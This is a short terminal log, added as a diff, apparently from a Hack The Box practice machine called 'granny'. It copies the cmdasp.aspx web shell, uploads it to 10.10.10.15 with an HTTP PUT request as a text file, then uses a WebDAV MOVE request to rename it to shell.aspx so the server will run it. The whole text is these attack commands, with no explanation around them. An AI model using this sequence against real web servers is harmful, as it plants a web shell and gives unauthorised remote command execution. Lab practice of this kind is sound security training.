@@ -1,0 +1,9 @@
+┌──(kali㉿kali)-[~/htb/granny]
+└─$ cp /usr/share/webshells/aspx/cmdasp.aspx .
+                                                                                                                   
+┌──(kali㉿kali)-[~/htb/granny]
+└─$ curl -X PUT http://10.10.10.15/shell.txt -d @cmdasp.aspx
+                                                                                                                   
+┌──(kali㉿kali)-[~/htb/granny]
+└─$ curl -X MOVE -H 'Destination:http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt
+
